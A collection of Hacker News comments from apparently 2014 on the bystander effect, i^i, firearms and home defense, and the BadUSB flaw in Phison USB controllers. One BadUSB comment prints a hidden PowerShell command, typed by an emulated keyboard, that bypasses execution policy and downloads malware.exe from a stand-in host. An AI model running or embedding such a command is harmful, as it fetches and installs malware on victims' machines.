E.g. the more clearly it is an emergency. But even situations where people are very obviously in distress can result in inaction - the Wikipedia page has several examples.<p>Cialdini (in Influence) notes that even specific cries for help in obvious emergencies are often ignored by groups. He himself was actually in a car crash, and realised people were just driving by and ignoring them, until he realised and made use of his own advice: Make yourself noticed, be specific about what help you need, and be specific about <i>who</i> you want to provide it. That is, screaming &quot;help&quot; gets you ignored. Screaming &quot;you in the blue jacket, call an ambulance&quot; gets people to respond. Once you first get a response, you get more response - the bystander effect works to your benefit: people see other people acting, and suddenly everyone accepts it&#x27;s an emergency and helps.<p>> If I knew the person was requesting help – even if I don&#x27;t know WHY they are requesting help – I would respond.<p>That may be true for you, <i>especially</i> if you are alone. But the moment group dynamics are triggered, the odds starts dropping that you will intervene with each extra person involved up until some fairly low limit (at which point the chance of intervention is quite small).",1412351910

They treated the kids decently, but there is only so much low paid help can do to remedy not having parents who care, or, having evil or disturbed parents.<p>Most of them were decent kids, but not educated and with impulse control problems.

8406058,comment,8405378,8405378,1,0,robomartin,,,"I disagree. I think this is patchable to a reasonable degree. I don&#x27;t mean that it would be 100% secure, of course.<p>All you need is a security layer requiring user authorization for execution of code from any USB device.  In addition to this you could add a setting to lock in a single USB keyboard. In other words, make the Hollywood movie scenario nearly impossible.<p>OK, why did I say &quot;nearly impossible&quot;?  Because a knowledgeable embedded engineer could very easily build a device that self-identifies to look exactly like your keyboard.  Your computer would not know them different.<p>Faced with that, the security layer would have to add a re-authorization state upon disconnection of the authorized keyboard.<p>Now you are vulnerable to reboot or a clever parallel wiring attack.  The latter is the case of someone building hardware that can be wired into your authorized keyboard after taking it apart.  The reboot vector could be mitigated by simply requiring the entry of a password in order to enable any execution/console commands to be accepted from the keyboard.  With this even a fully authorized keyboard would not have execution rights of a whole host of command line commands until re-authorized by the user.<p>None of this is perfect.  I just thought it up in five minutes. Absolute security isn&#x27;t achievable without the kinds of systems and controls in place at high security facilities.  However, I think it is possible to create an easy to use software layer that can stop a hacker with casual access to a system in a corporate setting.  All you have to do is slow them down enough to make it less palatable, much like a home alarm system.",1412351754

I remove them regularly from any Linux DE I use and if I can&#x27;t I don&#x27;t use that DE (no Unity here). I tolerated them on the very first Macs, the ones with tiny screens at the beginning of the 80s when we were always working full screen anyway, but IMHO they don&#x27;t belong to 15&quot; or larger screens.<p>Using OSX as a hypervisor to run Ubuntu in VMWare or VirtualBox seemed a waste of resources to me. Installing Linux as the only OS on a MBP doesn&#x27;t always give optimal results, so no Mac. However MBP 15&quot;&#x27;s 16:10 screen and the keyboard without number pad are good things (but Fn Backspace to Del, ugh).

My philosophy, at least, is that any idea can eventually be intuitive, no matter how difficult at first, if we find the right analogies.<p>I see any exponent like a^b as starting at 1.0, intending to apply a rate of change of (a), but modifying that rate by (b).<p>For example, 3^2 is an initial rate of change of 3x, which is then applied for 2 units of time [leading to 9]. So, 1.0 would turn into 9.0.<p>More here: <a href=""http://betterexplained.com/articles/understanding-exponents-why-does-00-1/"" rel=""nofollow"">http://betterexplained.com/articles/understanding-exponents-...</a><p>So what&#x27;s i^i?<p>Well, our rate of change is &quot;i&quot;, which means we plan on starting at 1.0 and having our rate of change be a rotation: 1.0 * i = 90 degrees on the unit circle.<p>If we are using i^i, that means we are <i>rotating our rate of change</i>. That is, we intended to rotate around the unit circle at 90 degrees, but now I&#x27;m going to turn the &quot;rocket boost&quot; which is applying that rotation by another 90 degrees (the i as the exponent). This means the rocket is facing 180 degrees (backwards) and our growth is going to be an exponential decay. We&#x27;ll be on the real number line, but shrinking.<p>How about (i^i)^i? That&#x27;s another 90-degree twist on the rocket, so it&#x27;s pointing 270 (downward) and we&#x27;ll rotate around the circle clockwise. It&#x27;s probably a negative imaginary number, and (i^i)^i actually equals -i.<p>This is a quick brain dump, and not very clear without diagrams, check out the articles above if you&#x27;d like!",1412351131

Most devices expose a limited interface to the bus which won&#x27;t allow direct manipulation of their respective microcontrollers (e.g. no re-writing, no alteration, etc).<p>The reason why we&#x27;re discussing Phison USB sticks is that they&#x27;re an exception. When you plug in a device with a Phison microcontroller, other devices or the computer can alter the microcontroller and have it act maliciously.<p>A common proof of concept is to have the USB stick&#x27;s microcontroller pretend to be other USB devices in order to escalate access. In this case they are emulating a fictional USB hub, a fictional USB keyboard, and the actual USB drive (which is routed through the fictional USB hub).<p>In order to send keystrokes they aren&#x27;t altering another keyboard on the USB bus, they&#x27;re generating them from the virtual keyboard they generated via software on the Phison microcontroller. There doesn&#x27;t need to be a real keyboard on that same bus for this to work (e.g. you could plug in a USB stick directly to a computer and this would still show up as a USB Hub, USB Keyboard, and USB Thumb Drive).<p>Once you have a virtual keyboard you can send gems like this (assume Windows):<p><pre><code>      Keys: WIN+R (0x5B + 0x52)     \n      Type: powershell.exe -ExecutionPolicy Bypass -WindowsStyle Hidden -Command &quot;&{ Invoke-WebRequest http://example.com/malware.exe -OutFile c:\\temp\\malware.exe}&quot;        \n      Keys: Return (0x0D)</code></pre>",1412349536

It&#x27;s something you should play by ear rather than blindly follow the above advice, the statistics are undoubtedly biased by people resisting when it makes sense.<p><i>Even if you are at home, in possession of a firearm, and well trained to use it, when confronted by an intruder your best defense is to get out of the house as quickly as possible.  In such a circumstance, a gun is a means of ensuring that no one can block your exit.</i><p>This above is very iffy advice.  Not only do you have much stronger legal protections inside your house, you&#x27;re likely to have much greater control over the situation, and control is perhaps his main message.  You know your house, can benefit from concealment and maybe even cover (that which a bullet cannot penetrate), you don&#x27;t know the situation outside the house.  You might escape only to be surprised by an armed accomplice.  Or suppose you do this just as the police arrive; more than a few armed homeowners have gotten shot by police mistaking them for criminals.<p>You also need to balance this advice about decreasing the risk to your physical skin with the psychological toll fleeing takes.<p><i>Nothing good ever comes to people who allow themselves to be moved to a remote location at the mercy of a violent predator.</i><p>In my Missouri concealed carry class they ran us through a simulator with police &quot;shoot/don&#x27;t shoot&quot; scenarios.  For mine, I would have been a lot more aggressive and would have tried to shoot at various times if I&#x27;d know the terrible statistics of the above which the instructor mentioned after it.<p>As for his advice to flee and leave your spouse or children to the tender mercies of someone who, as he notes, has demonstrated he wants more than your property, <i>if you have any other option I don&#x27;t want to know you</i>.  That includes your being in such a situation because you decided not to procure one or more firearms prior to the incident.<p>After I left home, I only procured firearms after I had a significant other to protect, or vice versa.  At that point it was an obligation, no matter what obstacles Massachusetts put in place (which aren&#x27;t really that bad for long guns, although that may be changing depending on the city you live in).<p>On the other hand, I picked up a very hard rule about hostages from Jerry Pournelle in <i>The Mote in God&#x27;s Eye</i>: at that point, you mentally treat the situation as if the criminal has killed the hostages, even if you then try to rescue them.  In this situation, as the author says, you don&#x27;t increase the toll by submitting yourself as well.  The odds are <i>very</i> high that will make the situation worse.<p>Final note, underlying a lot of what he says: if someone unknown knocks on the door, I don&#x27;t answer without having a gun in my hand.  If I&#x27;m expecting someone, I confirm it&#x27;s them before opening the door.  Or per a rule of Marine general James Mattis WRT to being in Iraq or Afghanistan during our recent unpleasantness, which addresses even more points the author made: &quot;<i>Be polite, be professional, but have a plan to kill everybody you meet.</i>&quot;",1412349315

Therefore your computer can&#x27;t know what kind of device can attach over USB; it&#x27;s left to the device itself to tell the computer what it is.<p>The big security problem that they found is that the computer has no way to verify that the usb device is actually the type of device that it proclaims to be. This opens up a massive security hole (as demonstrated at blackhat). A usb device can first tell the computer that it&#x27;s a mass-storage device, and then later change itself to a keyboard and then start &#x27;typing&#x27; commands as a user would. The computer can&#x27;t see if it&#x27;s a real keyboard or a fake keyboard, and that&#x27;s the problem.<p>This is not a vulnerability in your OS but rather a gross oversight in the USB specification. This vulnerability is shown to be cross platform(linux,windows) and cross hardware(2 different usb chipsets).

Maybe if they make it really clear the focus is not on racing into battle with the evil assailant, but on just heading over to ask if everything&#x27;s okay, that could be more useful.<p>In real life, I can imagine so many disasters unfolding -- like, you sprint into an alleyway in response to a call, and see a bleeding woman on the ground with a burly man crouching over her.  Q1: His back is to you -- can you take him out before he realizes you&#x27;re there?  Q2: he&#x27;s actually a passerby, and the actual assailant fled a minute ago.  How long will it take you to figure that out?<p>Or just -- escalating violence would be fairly common when totally untrained people race in to deal with violence, but (as other commenters are pointing out) the &quot;good guy&quot; and &quot;bad guy&quot; roles in people&#x27;s heads don&#x27;t correspond with the legal outcomes of it all.",1412348612
